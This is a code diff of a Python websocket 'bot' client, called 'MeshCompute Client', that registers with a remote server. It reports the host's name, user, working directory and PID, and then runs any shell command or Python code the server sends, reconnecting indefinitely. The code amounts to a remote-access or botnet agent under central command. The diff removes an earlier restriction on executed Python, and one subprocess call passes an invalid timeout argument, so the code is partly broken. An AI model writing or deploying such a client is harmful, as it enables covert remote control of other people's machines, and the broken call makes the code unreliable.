@@ -4,123 +4,103 @@ import json
 import uuid
 import platform
 import psutil
-import os
+import time
+import logging
 import subprocess
-from config import SERVER_URL, RECONNECT_DELAY
+import shlex
+import os
+from dotenv import load_dotenv
+from common.config import SERVER_URL, AUTH_TOKEN, MAX_COMMAND_TIMEOUT
 
-# Bot ID persistent machen
-BOT_ID_FILE = "bot_id.txt"
+load_dotenv()
 
-if os.path.exists(BOT_ID_FILE):
-    with open(BOT_ID_FILE, "r") as f:
-        BOT_ID = f.read().strip()
-else:
-    BOT_ID = str(uuid.uuid4())[:8]
-    with open(BOT_ID_FILE, "w") as f:
-        f.write(BOT_ID)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+bot_id = f"{str(uuid.uuid4())[:8]}-{platform.node()[:8]}"
 
 async def get_system_info():
     return {
         "hostname": platform.node(),
-        "os": platform.system(),
-        "cpu_cores": psutil.cpu_count(logical=False),
-        "cpu_threads": psutil.cpu_count(logical=True),
-        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
+        "os": platform.system() + " " + platform.release(),
         "python": platform.python_version(),
-        "cwd": os.getcwd()
+        "cpu": psutil.cpu_count(logical=False),
+        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
+        "username": os.getenv("USER") or os.getenv("USERNAME"),
+        "cwd": os.getcwd(),
+        "bot_id": bot_id,
+        "pid": os.getpid()
     }
 
-async def execute_shell(command: str):
-    # execute shell command
-    if not command:
-        return {"error": "No command specified"}
+async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     try:
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=60
+        args = shlex.split(cmd)
+        proc = await asyncio.create_subprocess_exec(
+            *args, stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE, timeout=timeout
         )
+        stdout, stderr = await proc.communicate()
         return {
-            "stdout": result.stdout,
-            "stderr": result.stderr,
-            "returncode": result.returncode,
-            "command": command
+            "success": proc.returncode == 0,
+            "output": stdout.decode('utf-8', errors='replace'),
+            "error": stderr.decode('utf-8', errors='replace'),
+            "returncode": proc.returncode
         }
-    except subprocess.TimeoutExpired:
-        return {"error": "Timeout after 60 seconds"}
     except Exception as e:
-        return {"error": str(e)}
+        return {"success": False, "error": str(e)}
 
-async def execute_python(code: str):
-    # execute python code
-    try:
-        local_vars = {}
-        exec(code, {"__builtins__": {}}, local_vars)
-        return {"status": "executed", "result": str(list(local_vars.keys())[-5:]) if local_vars else "ok"}
-    except Exception as e:
-        return {"error": str(e)}
-
-async def send_heartbeat(ws):
-    while True:
-        try:
-            await ws.send(json.dumps({"type": "heartbeat", "bot_id": BOT_ID}))
-            await asyncio.sleep(20)
-        except:
-            break
-
-async def client():
+async def main():
     while True:
         try:
             async with websockets.connect(SERVER_URL) as ws:
-                print(f"[{BOT_ID}] Connected with server")
-
-                # Registrieren
                 await ws.send(json.dumps({
                     "type": "register",
-                    "bot_id": BOT_ID,
+                    "auth_token": AUTH_TOKEN,
+                    "bot_id": bot_id,
                     "info": await get_system_info()
                 }))
-
-                # Heartbeat starten
-                heartbeat_task = asyncio.create_task(send_heartbeat(ws))
 
                 async for message in ws:
                     data = json.loads(message)
 
                     if data["type"] == "command":
+                        action = data["data"]["type"]
+                        payload = data["data"].get("payload")
                         task_id = data.get("task_id")
-                        cmd = data["data"]
-                        cmd_type = cmd.get("type")
-                        payload = cmd.get("payload")
 
-                        result = None
+                        result = {"type": "result", "task_id": task_id, "bot_id": bot_id}
 
-                        if cmd_type == "ping":
-                            result = "pong"
-                        elif cmd_type == "system_info":
-                            result = await get_system_info()
-                        elif cmd_type == "shell":
-                            result = await execute_shell(payload)
-                        elif cmd_type == "python":
-                            result = await execute_python(payload)
-                        else:
-                            result = f"Unbekannter Befehl: {cmd_type}"
+                        if action == "exec":
+                            res = await execute_command(payload)
+                            result.update(res)
+                            result["command"] = payload
 
-                        await ws.send(json.dumps({
-                            "type": "result",
-                            "bot_id": BOT_ID,
-                            "task_id": task_id,
-                            "data": result
-                        }))
+                        elif action == "sysinfo":
+                            result.update({
+                                "success": True,
+                                "info": await get_system_info()
+                            })
+
+                        elif action == "python":
+                            try:
+                                exec_globals = {}
+                                exec(payload, exec_globals)
+                                output = exec_globals.get("output", "Code executed (no output variable)")
+                                result.update({"success": True, "output": str(output)})
+                            except Exception as e:
+                                result.update({"success": False, "error": str(e)})
+
+                        elif action == "ps":
+                            processes = [{"pid": p.info['pid'], "name": p.info['name'], "cpu": p.info['cpu_percent']}
+                                       for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
+                            result.update({"success": True, "processes": processes[:50]})  # Limit
+
+                        await ws.send(json.dumps(result))
 
         except Exception as e:
-            print(f"[{BOT_ID}] Connection lost: {e}")
-            if 'heartbeat_task' in locals():
-                heartbeat_task.cancel()
-            await asyncio.sleep(RECONNECT_DELAY)
+            logger.error(f"Verbindung unterbrochen: {e}")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    print(f"Client started - ID: {BOT_ID}")
-    asyncio.run(client())
+    print(f"MeshCompute Client gestartet → {bot_id}")
+    asyncio.run(main())
